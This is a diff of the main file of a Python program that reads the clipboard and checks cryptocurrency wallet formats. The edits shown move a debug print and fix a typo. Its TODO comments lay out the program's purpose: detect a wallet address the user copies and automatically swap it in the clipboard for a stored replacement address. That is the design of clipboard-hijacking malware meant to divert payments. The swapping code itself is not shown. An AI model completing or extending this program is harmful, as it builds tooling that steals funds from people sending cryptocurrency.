@@ -8,14 +8,14 @@ ConsoleController().rich_traceback_handler()
 
 if __name__ == "__main__":
     ConsoleView().show_welcome_message()
-    #ClipboardController().print_clipboard_content()                                               #FIXME -----------------------------
-    ConsoleView().print_clipboard_content()
+
+    ConsoleView().print_clipboard_content()                                                     #FIXME -----------------------------
     print("======================================================")                             #FIXME         Added this
     print("Clipboard was printed above for debug purposes! Will be removed in next versions.")  #FIXME         for debug
     print("======================================================")                             #FIXME         purposes
-    print(ClipboardController().check_wallet_format("You_can_enter_any_wallet_here"))             #FIXME -----------------------------
+    print(ClipboardController().check_wallet_format("You_can_enter_any_wallet_here"))           #FIXME -----------------------------
 
-    #TODO enter your addres, leave blank if you don't want to use this one
+    #TODO enter your address, leave blank if you don't want to use this one
     #TODO repeat step from above X times, depending on currency(-ies) you want to use
     #TODO automatically check what type of address user entered and inform him about his choice
     #TODO automatically replace address in clipboard using corresponding replacement address, if available
